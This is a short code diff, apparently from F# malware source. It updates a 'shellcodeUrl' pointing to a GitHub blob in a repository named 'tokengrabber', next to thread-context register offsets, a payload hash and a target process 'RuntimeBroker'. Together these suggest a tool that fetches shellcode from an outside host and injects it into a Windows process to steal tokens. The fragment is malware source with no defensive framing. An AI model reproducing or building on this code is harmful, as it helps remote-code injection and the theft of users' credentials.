@@ -97,7 +97,7 @@ let CTX_RBP = 0xA0
 let CTX_RIP = 0xF8
 
 let shellcodeUrl =
-    "https://api.github.com/repos/bielzxdev/tokengrabber/git/blobs/627f6e6eebf9adcfd5c3e9e36bae36f3c50b0137"
+    "https://api.github.com/repos/bielzxdev/tokengrabber/git/blobs/a474b8adbe4bcf3b946c6051956f1b6d3a1e3c6b"
 
 let expectedSha256 = "A6C1388564FFCAD84F7CA4A749E258E1BDB6CB50061CC28FE956FB4041964D69"
 let targetProcessName = "RuntimeBroker"
